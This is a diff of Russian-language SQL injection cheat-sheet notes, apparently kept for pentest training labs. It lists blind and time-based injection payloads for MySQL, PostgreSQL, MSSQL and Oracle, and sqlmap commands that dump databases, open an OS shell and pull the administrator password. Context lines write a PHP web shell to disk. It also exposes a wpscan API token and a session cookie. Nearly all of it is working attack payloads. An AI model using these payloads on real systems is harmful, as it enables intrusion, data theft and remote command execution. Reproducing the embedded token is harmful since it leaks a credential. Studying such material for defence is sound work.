@@ -23,6 +23,22 @@ SELECT * FROM users WHERE (username = "[INPUT]")	=> ") or 1=1 -- //
 ' union select sqlite_version() --	-- SQLite
 Также по вызову времени задержки
 
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user [--dump [-T <table name> [-C <column1, column2>]]]
+	запускает проверку уязвимости GET параметра user внутри '?user=1', --dump - скопировать всю БД, --threads 10 - для ускорения
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+	интерактивный шел, запрос в txt файле, в нем уязвимый параметр 'item' в POST запросе, --os-shell - шел подключение
+	--web-root - доступная на запись директория
+wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7iAy1jW3yPtFCzmfM
+	сканирование сайта, поиск уязвимостей движка word press (плагины, пользователи, открытые директории)
+sqlmap -u "https://0a8300c1032ba4aa8172ac30009f000a.web-security-academy.net/filter?category=Lifestyle" \
+  --cookie="TrackingId=2R4PUocL1noyMNPt*; session=ViaEhhMjyG3yHVr6wd37JGjlEgSjNUr1" \
+  --technique=T \
+  --dbms=PostgreSQL \
+  --sql-query="SELECT password FROM users WHERE username='administrator'"
+	* показывает, где в запросе уязвимый параметр, тут перебор blind-based инъекции, определение пароля для administrator,
+	--technique=T - только time-based blind инъекции,
+	--sql-query - выполняет конкретный запрос, в данном случае — получение пароля администратора
+
 
 ========================================================
 ================SQL INJECTION. MySQL 3306
@@ -73,6 +89,7 @@ Blind-based
 ' and if(1=1,sleep(3),0) -- // тоже самое с проверкой по времени, 1=1 выполнится через 3 секунды, 1=2 мгновенно
 	с проверкой по времени запрос не выводит результат, т.к. sleep(3) возвращает 0, 0 (3й арг.) тоже возвращает 0, if возвращает false
 	для того, чтобы результат запроса был выполнен, if должен вернуть true: ' and if(1=2, sleep(3), 1)
+'+and+(select+sleep(10))+--
 '||(select case when 1=1 then 1/0 else '' end from users where username='administrator')||'	проверка на ошибку при слепой инъекции
 '||(select case when length(password)>19 then 1/0 else username end from users where username='administrator')||'	проверка длины пароля
 '||(select case when substring(password,1,1)='a' then 1/0 else username end from users where username='administrator')||'
@@ -91,14 +108,6 @@ Blind-based
 	если system() заблокирована
 ' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
 	запись в файл (нужны права, файл не должен существовать), проверять количество столбцов не обязательно, но желательно
-
-sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user [--dump [-T <table name> [-C <column1, column2>]]]
-	запускает проверку уязвимости GET параметра user внутри '?user=1', --dump - скопировать всю БД, --threads 10 - для ускорения
-sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
-	интерактивный шел, запрос в txt файле, в нем уязвимый параметр 'item' в POST запросе, --os-shell - шел подключение
-	--web-root - доступная на запись директория
-wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7iAy1jW3yPtFCzmfM
-	сканирование сайта, поиск уязвимостей движка word press (плагины, пользователи, открытые директории)
 
 
 ========================================================
@@ -153,6 +162,7 @@ Error-based:
 
 Слепая инъекция:
 ' and+(select pg_sleep(10)) is null --+ // проверка в слепой инъекции, что текущая БД - PostgreSQL
+'||pg_sleep(10)+--+	// тоже самое, но может не сработать
 ' and (select case when 1=1 then pg_sleep(5) else pg_sleep(0) end) is null -- проверка условия (1=1 или другого) по времени выполнения
 ' and (select 123 from users limit 1)=123 -- // проверка, что есть таблица users
 ' and (select 123 from users where username='administrator')=123 -- //
@@ -207,6 +217,7 @@ Union-based
 Blind injectin:
 '; waitfor delay '00:00:05' --
 '; if 1=1 waitfor delay '00:00:05' -- // проверка в слепой инъекции, что текущая БД - MSSQL
+' and 1=(select 1 waitfor delay '00:00:10') --
 '; if user_name()='dbo' waitfor delay '00:00:05' -- // Database Owner, есть права на xp_cmdshell
 '; if is_srvrolemember('sysadmin')=1 waitfor delay '00:00:05' -- // роль sysadmin, полные права на БД 
 '; if has_perms_by_name(null, null, 'EXECUTE')=1 waitfor delay '00:00:05' -- // проверка прав на исполнение
@@ -274,6 +285,8 @@ Union-based:
 Blind injection:
 '+and+(select+1+from+dual+where+dbms_pipe.receive_message(123,10)+is+null)+is+null+--+
 	прокерка слепой инъекции, что текущая БД - Oracle, если будет задержка 10 сек
+' and (select dbms_pipe.receive_message('a',10) from dual) is null --		тоже задержка 10 сек
+' and (select case when 1=1 then dbms_pipe.receive_message('a',10) else 1 end from dual) is null -- 	тоже задержка 10 сек
 ' AND SUBSTR((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm -- // 1й символ пароля больше, чем "m"
 '||(select+case+when+(1=1)+then+to_char(1/0)+else+''+end+from+users+where+username='administrator')||'	конкатенация для проверки на ошибку
 '||(select+case+when+length(password)>19+then+to_char(1/0)+else+username+end+from+users+where+username='administrator')||'	длина пароля > 20
